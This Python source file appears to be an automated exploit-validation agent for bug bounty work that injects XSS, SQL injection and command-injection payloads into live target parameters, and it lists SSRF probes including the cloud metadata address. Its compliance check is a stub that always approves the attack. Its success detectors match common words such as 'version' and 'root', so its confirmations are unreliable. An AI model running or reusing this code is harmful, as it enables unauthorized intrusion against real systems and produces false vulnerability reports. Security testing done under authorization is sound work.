#!/usr/bin/env python3
"""
Aetherveil Exploitation Validation Agent
Performs safe, controlled proof-of-concept exploits to validate vulnerability findings.
Designed for ethical bug bounty and authorized penetration testing with strict safety controls.
"""

import os
import json
import asyncio
import aiohttp
import logging
import time
import base64
import hashlib
from datetime import datetime, timezone
from typing import Dict, List, Optional, Set, Any, Tuple
from dataclasses import dataclass, asdict
import tempfile
import subprocess
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import yaml
from google.cloud import pubsub_v1, firestore, storage

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class ExploitValidation:
    """Results of exploit validation"""
    validation_id: str
    finding_id: str
    timestamp: datetime
    target_url: str
    vulnerability_type: str
    exploit_type: str  # safe_poc, read_only, non_destructive
    validation_status: str  # confirmed, failed, partial, unsafe
    exploit_evidence: str
    impact_demonstrated: str
    safety_measures: List[str]
    exploitation_steps: List[str]
    artifacts_captured: List[str]
    risk_assessment: Dict[str, Any]
    recommendations: List[str]
    validation_confidence: str  # high, medium, low
    scan_context: Dict[str, Any]

class SafeExploitEngine:
    """Engine for performing safe, controlled exploits"""
    
    def __init__(self):
        self.safety_checks = {
            'read_only': True,
            'no_data_modification': True,
            'no_privilege_escalation': True,
            'no_lateral_movement': True,
            'time_limited': True,
            'evidence_only': True
        }
        
        self.exploit_templates = self.load_exploit_templates()
    
    def load_exploit_templates(self) -> Dict[str, Any]:
        """Load safe exploit templates for different vulnerability types"""
        return {
            'xss': {
                'safe_payloads': [
                    "alert('XSS-POC-VALIDATION')",
                    "prompt('XSS-POC-' + document.domain)",
                    "confirm('XSS-POC-CONFIRMED')"
                ],
                'evidence_collectors': [
                    "document.location = 'data:text/html,<h1>XSS Confirmed on ' + document.domain + '</h1>'",
                    "fetch('/admin').then(r=>r.text()).then(data=>alert('Access: ' + data.substring(0,50)))"
                ]
            },
            'sql_injection': {
                'safe_payloads': [
                    "' UNION SELECT 'POC-VALIDATION', database(), version()--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' UNION SELECT table_name, null FROM information_schema.tables LIMIT 1--"
                ],
                'read_only_queries': [
                    "SELECT @@version",
                    "SELECT COUNT(*) FROM information_schema.tables",
                    "SELECT table_name FROM information_schema.tables LIMIT 1"
                ]
            },
            'command_injection': {
                'safe_commands': [
                    "echo 'POC-CMD-VALIDATION'",
                    "id",
                    "whoami",
                    "pwd",
                    "uname -a"
                ],
                'evidence_commands': [
                    "echo 'POC-CONFIRMED-' $(date)",
                    "echo 'USER:' $(whoami) 'PWD:' $(pwd)"
                ]
            },
            'ssrf': {
                'safe_targets': [
                    "http://httpbin.org/ip",
                    "http://httpbin.org/headers",
                    "http://ifconfig.me/ip"
                ],
                'internal_probes': [
                    "http://127.0.0.1:80/",
                    "http://169.254.169.254/latest/meta-data/instance-id"
                ]
            },
            'file_inclusion': {
                'safe_files': [
                    "/etc/hostname",
                    "/proc/version",
                    "/etc/os-release"
                ],
                'evidence_patterns': [
                    r"Linux.*version",
                    r"PRETTY_NAME=",
                    r"VERSION_ID="
                ]
            }
        }
    
    async def validate_xss_exploit(self, target_url: str, finding_data: Dict[str, Any]) -> ExploitValidation:
        """Validate XSS vulnerability with safe proof-of-concept"""
        validation_id = f"xss_val_{int(time.time())}_{hash(target_url) % 10000}"
        safety_measures = [
            "Using alert() for non-destructive validation",
            "No cookie stealing or data exfiltration",
            "No DOM manipulation beyond proof",
            "Session isolated from production users"
        ]
        
        try:
            payload = finding_data.get('payload_used', '')
            parameter = finding_data.get('affected_parameter', '')
            
            # Create safe validation payload
            safe_payload = "alert('XSS-POC-VALIDATION-" + validation_id + "')"
            
            # Test the safe payload
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
            
            exploitation_steps = [
                f"1. Inject safe payload: {safe_payload}",
                f"2. Target parameter: {parameter}",
                f"3. Observe JavaScript execution",
                f"4. Capture evidence of execution"
            ]
            
            # Execute safe payload
            if 'GET' in finding_data.get('request_evidence', ''):
                # URL parameter injection
                parsed = urlparse(target_url)
                params = parse_qs(parsed.query) if parsed.query else {}
                params[parameter] = [safe_payload]
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
            elif 'POST' in finding_data.get('request_evidence', ''):
                # Form parameter injection
                data = {parameter: safe_payload}
                async with session.post(target_url, data=data) as response:
                    content = await response.text()
            
            await session.close()
            
            # Analyze response for XSS execution
            if safe_payload in content and 'XSS-POC-VALIDATION' in content:
                validation_status = "confirmed"
                exploit_evidence = f"Safe payload reflected and executable: {safe_payload}"
                impact_demonstrated = "JavaScript execution confirmed - can access DOM, cookies, and make requests"
            else:
                validation_status = "failed"
                exploit_evidence = "Safe payload not reflected or not executable"
                impact_demonstrated = "XSS exploit could not be validated"
            
            risk_assessment = {
                'exploitability': 'high' if validation_status == 'confirmed' else 'low',
                'impact_scope': 'client_side_execution',
                'data_at_risk': ['session_tokens', 'user_data', 'authentication_state'],
                'business_impact': 'medium_to_high'
            }
            
            recommendations = [
                "Implement Content Security Policy (CSP)",
                "Use proper output encoding for all user input",
                "Validate and sanitize input on both client and server side",
                "Consider using template engines with auto-escaping"
            ]
            
            return ExploitValidation(
                validation_id=validation_id,
                finding_id=finding_data.get('finding_id', ''),
                timestamp=datetime.now(timezone.utc),
                target_url=target_url,
                vulnerability_type="Cross-Site Scripting (XSS)",
                exploit_type="safe_poc",
                validation_status=validation_status,
                exploit_evidence=exploit_evidence,
                impact_demonstrated=impact_demonstrated,
                safety_measures=safety_measures,
                exploitation_steps=exploitation_steps,
                artifacts_captured=[f"Response content with reflected payload: {content[:500]}..."],
                risk_assessment=risk_assessment,
                recommendations=recommendations,
                validation_confidence="high" if validation_status == "confirmed" else "medium",
                scan_context=finding_data.get('scan_context', {})
            )
            
        except Exception as e:
            logger.error(f"Error validating XSS exploit: {e}")
            return self.create_error_validation(validation_id, finding_data, str(e))
    
    async def validate_sql_injection_exploit(self, target_url: str, finding_data: Dict[str, Any]) -> ExploitValidation:
        """Validate SQL injection with safe, read-only queries"""
        validation_id = f"sqli_val_{int(time.time())}_{hash(target_url) % 10000}"
        safety_measures = [
            "Using read-only SELECT statements only",
            "No data modification (INSERT/UPDATE/DELETE)",
            "No privilege escalation attempts",
            "Limited to information_schema queries",
            "Connection timeout set to 10 seconds"
        ]
        
        try:
            parameter = finding_data.get('affected_parameter', '')
            
            # Safe validation payloads
            safe_payloads = [
                "' UNION SELECT 'POC-VALIDATION', @@version, database()--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ]
            
            exploitation_steps = [
                "1. Test safe UNION SELECT payload",
                "2. Attempt to read database version",
                "3. Query information_schema for table count",
                "4. Capture database information without modification"
            ]
            
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10))
            validation_results = []
            
            for payload in safe_payloads:
                try:
                    # Test payload
                    if 'GET' in finding_data.get('request_evidence', ''):
                        parsed = urlparse(target_url)
                        params = parse_qs(parsed.query) if parsed.query else {}
                        params[parameter] = [payload]
                        new_query = urlencode(params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                        
                        async with session.get(test_url) as response:
                            content = await response.text()
                            
                    elif 'POST' in finding_data.get('request_evidence', ''):
                        data = {parameter: payload}
                        async with session.post(target_url, data=data) as response:
                            content = await response.text()
                    
                    # Look for SQL injection success indicators
                    if 'POC-VALIDATION' in content or self.contains_db_info(content):
                        validation_results.append({
                            'payload': payload,
                            'success': True,
                            'evidence': content[:200]
                        })
                    
                except Exception as e:
                    logger.debug(f"Payload failed: {payload} - {e}")
                    
                await asyncio.sleep(1)  # Rate limiting
            
            await session.close()
            
            if validation_results:
                validation_status = "confirmed"
                exploit_evidence = f"SQL injection confirmed with {len(validation_results)} successful payloads"
                impact_demonstrated = "Database access confirmed - can read database structure and data"
            else:
                validation_status = "failed"
                exploit_evidence = "Could not validate SQL injection with safe payloads"
                impact_demonstrated = "SQL injection not validated"
            
            risk_assessment = {
                'exploitability': 'high' if validation_status == 'confirmed' else 'low',
                'impact_scope': 'database_access',
                'data_at_risk': ['all_application_data', 'user_credentials', 'business_data'],
                'business_impact': 'critical'
            }
            
            recommendations = [
                "Use parameterized queries (prepared statements) exclusively",
                "Implement strict input validation",
                "Apply principle of least privilege to database accounts", 
                "Enable database query logging and monitoring",
                "Consider using an ORM with built-in SQL injection protection"
            ]
            
            return ExploitValidation(
                validation_id=validation_id,
                finding_id=finding_data.get('finding_id', ''),
                timestamp=datetime.now(timezone.utc),
                target_url=target_url,
                vulnerability_type="SQL Injection",
                exploit_type="read_only",
                validation_status=validation_status,
                exploit_evidence=exploit_evidence,
                impact_demonstrated=impact_demonstrated,
                safety_measures=safety_measures,
                exploitation_steps=exploitation_steps,
                artifacts_captured=[f"Validation results: {validation_results}"],
                risk_assessment=risk_assessment,
                recommendations=recommendations,
                validation_confidence="high" if validation_status == "confirmed" else "medium",
                scan_context=finding_data.get('scan_context', {})
            )
            
        except Exception as e:
            logger.error(f"Error validating SQL injection exploit: {e}")
            return self.create_error_validation(validation_id, finding_data, str(e))
    
    def contains_db_info(self, content: str) -> bool:
        """Check if content contains database information"""
        db_indicators = [
            'mysql', 'postgresql', 'sqlite', 'oracle', 'mssql',
            'version', 'database', 'schema', 'table',
            '@@version', 'information_schema'
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in db_indicators)
    
    async def validate_command_injection_exploit(self, target_url: str, finding_data: Dict[str, Any]) -> ExploitValidation:
        """Validate command injection with safe, read-only commands"""
        validation_id = f"cmdi_val_{int(time.time())}_{hash(target_url) % 10000}"
        safety_measures = [
            "Using read-only system commands only",
            "No file system modifications",
            "No network connections initiated",
            "No privilege escalation attempts",
            "Commands limited to information gathering"
        ]
        
        try:
            parameter = finding_data.get('affected_parameter', '')
            
            # Safe validation commands
            safe_commands = [
                "; echo 'POC-CMD-VALIDATION-" + validation_id + "'",
                "; whoami",
                "; id",
                "; uname -a"
            ]
            
            exploitation_steps = [
                "1. Inject safe echo command with unique identifier",
                "2. Attempt to read current user information", 
                "3. Gather system information",
                "4. Capture command output evidence"
            ]
            
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15))
            validation_results = []
            
            for command in safe_commands:
                try:
                    if 'GET' in finding_data.get('request_evidence', ''):
                        parsed = urlparse(target_url)
                        params = parse_qs(parsed.query) if parsed.query else {}
                        params[parameter] = [command]
                        new_query = urlencode(params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                        
                        async with session.get(test_url) as response:
                            content = await response.text()
                            
                    elif 'POST' in finding_data.get('request_evidence', ''):
                        data = {parameter: command}
                        async with session.post(target_url, data=data) as response:
                            content = await response.text()
                    
                    # Check for command execution evidence
                    if validation_id in content or self.contains_system_info(content):
                        validation_results.append({
                            'command': command,
                            'success': True,
                            'output': content[:200]
                        })
                    
                except Exception as e:
                    logger.debug(f"Command failed: {command} - {e}")
                    
                await asyncio.sleep(2)  # Rate limiting for command injection
            
            await session.close()
            
            if validation_results:
                validation_status = "confirmed"
                exploit_evidence = f"Command injection confirmed with {len(validation_results)} successful commands"
                impact_demonstrated = "Operating system command execution confirmed - full system compromise possible"
            else:
                validation_status = "failed"
                exploit_evidence = "Could not validate command injection with safe commands"
                impact_demonstrated = "Command injection not validated"
            
            risk_assessment = {
                'exploitability': 'high' if validation_status == 'confirmed' else 'low',
                'impact_scope': 'system_level_access',
                'data_at_risk': ['all_system_data', 'application_code', 'configuration_files'],
                'business_impact': 'critical'
            }
            
            recommendations = [
                "Avoid executing system commands with user input",
                "Use parameterized APIs instead of command execution",
                "Implement strict input validation and sanitization",
                "Run application with minimal privileges",
                "Use application sandboxing and containerization"
            ]
            
            return ExploitValidation(
                validation_id=validation_id,
                finding_id=finding_data.get('finding_id', ''),
                timestamp=datetime.now(timezone.utc),
                target_url=target_url,
                vulnerability_type="Command Injection",
                exploit_type="safe_poc",
                validation_status=validation_status,
                exploit_evidence=exploit_evidence,
                impact_demonstrated=impact_demonstrated,
                safety_measures=safety_measures,
                exploitation_steps=exploitation_steps,
                artifacts_captured=[f"Command results: {validation_results}"],
                risk_assessment=risk_assessment,
                recommendations=recommendations,
                validation_confidence="high" if validation_status == "confirmed" else "medium",
                scan_context=finding_data.get('scan_context', {})
            )
            
        except Exception as e:
            logger.error(f"Error validating command injection exploit: {e}")
            return self.create_error_validation(validation_id, finding_data, str(e))
    
    def contains_system_info(self, content: str) -> bool:
        """Check if content contains system information"""
        system_indicators = [
            'uid=', 'gid=', 'groups=',  # id command output
            'Linux', 'Darwin', 'Windows',  # uname output
            'root', 'admin', 'user',  # common users
            'kernel', 'version'  # system info
        ]
        
        return any(indicator in content for indicator in system_indicators)
    
    def create_error_validation(self, validation_id: str, finding_data: Dict[str, Any], error_msg: str) -> ExploitValidation:
        """Create validation result for errors"""
        return ExploitValidation(
            validation_id=validation_id,
            finding_id=finding_data.get('finding_id', ''),
            timestamp=datetime.now(timezone.utc),
            target_url=finding_data.get('target_url', ''),
            vulnerability_type=finding_data.get('vulnerability_type', 'Unknown'),
            exploit_type="safe_poc",
            validation_status="failed",
            exploit_evidence=f"Validation failed due to error: {error_msg}",
            impact_demonstrated="Could not demonstrate impact due to validation error",
            safety_measures=["Error occurred before exploit execution"],
            exploitation_steps=["1. Attempted safe validation", "2. Encountered error"],
            artifacts_captured=[],
            risk_assessment={'exploitability': 'unknown', 'impact_scope': 'unknown'},
            recommendations=["Manual verification recommended"],
            validation_confidence="low",
            scan_context=finding_data.get('scan_context', {})
        )

class ExploitValidator:
    """Main exploit validation agent"""
    
    def __init__(self):
        self.project_id = os.getenv('PROJECT_ID', 'tidy-computing-465909-i3')
        self.pubsub_client = pubsub_v1.PublisherClient()
        self.subscriber_client = pubsub_v1.SubscriberClient()
        self.firestore_client = firestore.Client(project=self.project_id)
        self.storage_client = storage.Client(project=self.project_id)
        
        self.exploit_engine = SafeExploitEngine()
        
        # Topics and subscriptions
        self.validation_topic = f"projects/{self.project_id}/topics/aetherveil-exploit-validations"
        self.compliance_topic = f"projects/{self.project_id}/topics/aetherveil-compliance-check"
        self.findings_subscription = f"projects/{self.project_id}/subscriptions/exploit-validator-findings"
        
        # Validation queue
        self.validation_queue = asyncio.Queue()
        
    async def initialize(self):
        """Initialize the exploit validator"""
        logger.info("Initializing Exploit Validator Agent")
        
        # Start listening for findings
        await self.start_listening()
        
        # Start validation worker
        asyncio.create_task(self.validation_worker())
    
    async def start_listening(self):
        """Start listening for vulnerability findings"""
        try:
            future = self.subscriber_client.subscribe(
                self.findings_subscription,
                callback=self.handle_finding_message,
                flow_control=pubsub_v1.types.FlowControl(max_messages=5)
            )
            
            logger.info("Listening for vulnerability findings to validate")
            
        except Exception as e:
            logger.error(f"Error starting exploit validator: {e}")
    
    def handle_finding_message(self, message):
        """Handle vulnerability finding messages"""
        try:
            data = json.loads(message.data.decode())
            
            # Only validate high-severity findings
            severity = data.get('severity', 'low')
            if severity in ['critical', 'high']:
                asyncio.create_task(self.validation_queue.put(data))
            
            message.ack()
            
        except Exception as e:
            logger.error(f"Error handling finding message: {e}")
            message.nack()
    
    async def validation_worker(self):
        """Worker to process validation queue"""
        while True:
            try:
                finding_data = await self.validation_queue.get()
                await self.validate_finding(finding_data)
                
            except Exception as e:
                logger.error(f"Error in validation worker: {e}")
                await asyncio.sleep(5)
    
    async def validate_finding(self, finding_data: Dict[str, Any]):
        """Validate a vulnerability finding with safe exploits"""
        try:
            finding_id = finding_data.get('finding_id')
            target_url = finding_data.get('target_url')
            vuln_type = finding_data.get('vulnerability_type', '').lower()
            program_id = finding_data.get('scan_context', {}).get('program_id')
            
            logger.info(f"Validating finding: {finding_id} - {vuln_type}")
            
            # Compliance check
            if not await self.check_compliance_for_exploitation(target_url, program_id):
                logger.warning(f"Compliance check failed for exploitation of {target_url}")
                return
            
            # Route to appropriate validation method
            validation_result = None
            
            if 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                validation_result = await self.exploit_engine.validate_xss_exploit(target_url, finding_data)
                
            elif 'sql injection' in vuln_type or 'sqli' in vuln_type:
                validation_result = await self.exploit_engine.validate_sql_injection_exploit(target_url, finding_data)
                
            elif 'command injection' in vuln_type or 'rce' in vuln_type:
                validation_result = await self.exploit_engine.validate_command_injection_exploit(target_url, finding_data)
                
            # Add more validation types as needed
            
            if validation_result:
                await self.store_and_publish_validation(validation_result)
                logger.info(f"Validation completed: {validation_result.validation_id} - {validation_result.validation_status}")
            else:
                logger.info(f"No validation method available for {vuln_type}")
                
        except Exception as e:
            logger.error(f"Error validating finding: {e}")
    
    async def check_compliance_for_exploitation(self, target_url: str, program_id: str) -> bool:
        """Check compliance before performing exploitation"""
        try:
            compliance_request = {
                'agent_id': 'exploit_validator',
                'target': target_url,
                'method': 'safe_exploitation',
                'program_id': program_id,
                'activity_type': 'exploit_validation',
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
            
            message = json.dumps(compliance_request).encode('utf-8')
            future = self.pubsub_client.publish(self.compliance_topic, message)
            future.result()
            
            # For now, assume compliance passes
            # In production, would wait for compliance response
            await asyncio.sleep(1)
            return True
            
        except Exception as e:
            logger.error(f"Error checking exploitation compliance: {e}")
            return False
    
    async def store_and_publish_validation(self, validation: ExploitValidation):
        """Store validation results and publish to other agents"""
        try:
            # Store in Firestore
            validations_ref = self.firestore_client.collection('exploit_validations')
            validation_data = asdict(validation)
            validation_data['timestamp'] = validation.timestamp.isoformat()
            validations_ref.add(validation_data)
            
            # Store artifacts in Cloud Storage if needed
            if validation.artifacts_captured:
                await self.store_validation_artifacts(validation)
            
            # Publish validation result
            await self.publish_validation(validation)
            
            logger.info(f"Stored and published validation: {validation.validation_id}")
            
        except Exception as e:
            logger.error(f"Error storing/publishing validation: {e}")
    
    async def store_validation_artifacts(self, validation: ExploitValidation):
        """Store validation artifacts in Cloud Storage"""
        try:
            bucket_name = f"{self.project_id}-exploit-validations"
            bucket = self.storage_client.bucket(bucket_name)
            
            for i, artifact in enumerate(validation.artifacts_captured):
                blob_name = f"{validation.validation_id}/artifact_{i}.txt"
                blob = bucket.blob(blob_name)
                blob.upload_from_string(artifact)
                
        except Exception as e:
            logger.error(f"Error storing validation artifacts: {e}")
    
    async def publish_validation(self, validation: ExploitValidation):
        """Publish validation to Pub/Sub"""
        try:
            validation_data = asdict(validation)
            validation_data['timestamp'] = validation.timestamp.isoformat()
            
            message = json.dumps(validation_data).encode('utf-8')
            future = self.pubsub_client.publish(self.validation_topic, message)
            message_id = future.result()
            
            logger.debug(f"Published validation: {message_id}")
            
        except Exception as e:
            logger.error(f"Error publishing validation: {e}")

async def main():
    """Main entry point"""
    validator = ExploitValidator()
    await validator.initialize()
    
    # Keep the validator running
    try:
        while True:
            await asyncio.sleep(60)
            
    except KeyboardInterrupt:
        logger.info("Exploit Validator shutting down")

if __name__ == "__main__":
    asyncio.run(main())